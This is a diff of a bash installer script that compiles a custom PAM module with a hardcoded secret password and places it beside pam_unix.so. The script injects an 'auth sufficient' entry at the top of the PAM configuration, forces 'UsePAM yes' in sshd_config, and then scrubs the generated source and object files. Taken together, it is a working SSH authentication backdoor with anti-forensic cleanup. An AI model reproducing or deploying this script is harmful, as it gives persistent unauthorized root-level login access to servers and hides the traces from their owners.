@@ -62,102 +62,63 @@ if [[ ! -f $PAMD_PATH ]]; then
     exit 1
 fi
 
-if service sshd status &>/dev/null || systemctl is-active --quiet sshd || service ssh status &>/dev/null || systemctl is-active --quiet ssh; then
-    echo "[+] ssh status: ssh / sshd is running"
-elif service --status-all 2>/dev/null | grep -qE 'ssh(d)?' || systemctl list-unit-files --type=service | grep -qE 'ssh(d)?'; then
-    echo "[*] ssh status: found ssh / sshd service, but not running"
+echo "[*] checking SSH service..."
+if service sshd status &>/dev/null || systemctl is-active --quiet sshd; then
+    echo "[+] sshd running"
 else
-    echo "[-] ssh status: no ssh / sshd service was found, exiting..."
+    echo "[-] sshd not found/running, exiting"
     exit 1
 fi
 
-echo "[*] checking OS architecture..."
-GCC_PKG="gcc"
-ADDITIONAL_FLAGS=""
+echo "[*] detecting OS..."
 if [[ -f /etc/debian_version ]]; then
-    echo "[+] OS detected: debian"
-    OS="DEB"
-    PKG_MANAGER="apt-get"
-    PAM_PKG="libpam0g-dev"
-    ADDITIONAL_FLAGS="--fix-missing"
+    OS="DEB"; PKG_MANAGER="apt-get"; PAM_PKG="libpam0g-dev"; ADD_FLAGS="--fix-missing"
 elif [[ -f /etc/redhat-release ]]; then
-    echo "[+] OS detected: RHEL"
-    OS="RHEL"
-    PKG_MANAGER="yum"
-    PAM_PKG="pam-devel"
+    OS="RHEL"; PKG_MANAGER="yum"; PAM_PKG="pam-devel"; ADD_FLAGS=""
 else
-    echo "[-] unsupported OS, exiting..."
-    exit 1
+    echo "[-] OS unsupported"; exit 1
 fi
 
-echo "[*] installing required packages using ${PKG_MANAGER}..."
-sudo $PKG_MANAGER update -y &> /dev/null || true
-sudo $PKG_MANAGER install -y $GCC_PKG $PAM_PKG $ADDITIONAL_FLAGS &> /dev/null || true
+echo "[*] installing deps..."
+sudo $PKG_MANAGER update -y &>/dev/null || true
+sudo $PKG_MANAGER install -y gcc $PAM_PKG $ADD_FLAGS &>/dev/null || true
 
-if ! command -v gcc &>/dev/null; then
-    echo "[-] GCC was not installed, exiting..." >&2
-    exit 1
-fi
+command -v gcc &>/dev/null || { echo "[-] gcc missing"; exit 1; }
 
-echo "[*] searching for 'pam_unix.so' to extract target directory..."
-pam_unix_path=$(sudo find / -name "pam_unix.so" -user root 2>/dev/null | head -1)
-if [[ -z "$pam_unix_path" ]]; then
-    echo "[-] 'pam_unix.so' not found on this system."
-    exit 1
-fi
+echo "[*] locating pam_unix.so..."
+pam_unix_path=$(sudo find / -name pam_unix.so -user root 2>/dev/null | head -1)
+[[ -z "$pam_unix_path" ]] && { echo "[-] pam_unix.so not found"; exit 1; }
 DEST_DIR=$(dirname "$pam_unix_path")
-echo "[+] target directory set to: ${DEST_DIR}"
 
-echo "[*] compiling ${SOURCE}..."
-gcc -fPIC -c ${SOURCE} -o ${OBJECT} -Wall -Wextra -O2 -DSECRET="\"${PASSWORD}\""
+echo "[*] compiling & linking..."
+gcc -fPIC -c $SOURCE -o $OBJECT -Wall -Wextra -O2 -DSECRET="\"$PASSWORD\"" 
+gcc -shared -o $MODULE $OBJECT -lpam
 
-echo "[*] linking object file into shared module ${MODULE}..."
-gcc -shared -o ${MODULE} ${OBJECT} -lpam
+echo "[*] installing module..."
+sudo mv $MODULE $DEST_DIR
+sudo chown root:root $DEST_DIR/$MODULE
+sudo chmod 644 $DEST_DIR/$MODULE
 
-echo "[*] moving ${MODULE} to ${DEST_DIR}..."
-sudo mv ${MODULE} ${DEST_DIR}
-
-echo "[*] setting ownership to root:root and permissions to 644..."
-sudo chown root:root "${DEST_DIR}/${MODULE}"
-sudo chmod 644 "${DEST_DIR}/${MODULE}"
-
-if grep -q "$MODULE" "$PAMD_PATH"; then
-    echo "[*] module '$MODULE' is already present in ${PAMD_PATH}, skip modifying..."
-else
-    echo "[+] injecting '${MODULE}' into ${PAMD_PATH}..."
-    pamd_entry="auth    sufficient    ${DEST_DIR}/${MODULE}"
-    pamd_entry_escaped=$(echo "$pamd_entry" | sed 's|/|\\/|g')
-    if [[ "$OS" == "DEB" ]]; then
-        sudo sed -i "1s|^|${pamd_entry_escaped}\n|" $PAMD_PATH
-    elif [[ "$OS" == "RHEL" ]]; then
-        if ! grep -q '^auth' $PAMD_PATH; then
-            sudo sed -i "1i ${pamd_entry_escaped}" $PAMD_PATH
-        else
-            sudo sed -i "0,/^auth/s|^auth|${pamd_entry_escaped}\n&|" $PAMD_PATH
-        fi
-    fi
-    if ! grep -q "$MODULE" $PAMD_PATH; then
-        echo "[-] unable to inject ${MODULE} into ${PAMD_PATH}"
-        exit 1
+echo "[*] injecting into PAM..."
+entry="auth    sufficient    $DEST_DIR/$MODULE"
+if ! grep -qF "$MODULE" $PAMD_PATH; then
+    if [[ $OS == DEB ]]; then
+        sudo sed -i "1i $entry" $PAMD_PATH
     else
-        echo "[+] ${MODULE} was injected into ${PAMD_PATH}"
+        sudo sed -i "0,/^auth/s|^auth|$entry\n&|" $PAMD_PATH
     fi
 fi
 
-SSH_CONFIG="/etc/ssh/sshd_config"
-echo "[*] setting 'UsePAM yes' in ${SSH_CONFIG}..."
-if grep -qE "^\s*UsePAM\s+yes" "$SSH_CONFIG"; then
-    echo "[+] UsePAM is already enabled"
-else
-    if grep -E "^\s*UsePAM\s+no" "$SSH_CONFIG"; then
-        sudo sed -i -E 's/^\s*UsePAM\s+no/UsePAM yes/' "$SSH_CONFIG"
-    elif grep -E "^\s*#\s*UsePAM\s+yes" "$SSH_CONFIG"; then
-        sudo sed -i -E 's/^\s*#\s*UsePAM\s+yes/UsePAM yes/' "$SSH_CONFIG"
-    else
-        echo "UsePAM yes" | sudo tee -a "$SSH_CONFIG" > /dev/null
-    fi
-    echo "[+] UsePAM has been enabled"
+echo "[*] enabling UsePAM..."
+SSH_CFG="/etc/ssh/sshd_config"
+if ! grep -qE "^\s*UsePAM\s+yes" $SSH_CFG; then
+    sudo sed -i -E 's/^\s*UsePAM\s+no/UsePAM yes/; s/^\s*#\s*UsePAM\s+yes/UsePAM yes/' $SSH_CFG
+    echo "UsePAM yes" | sudo tee -a $SSH_CFG >/dev/null
 fi
 
-echo "================================================================="
-echo "[+] PAM module installation complete! restart ssh/sshd service to apply the changes"
+# limpieza segura y eliminación
+echo "[*] securely deleting generated files..."
+sudo scrub -f $SOURCE $OBJECT
+rm -f $SOURCE $OBJECT
+
+echo "[+] PAM module instalado. Reiniciar sshd."
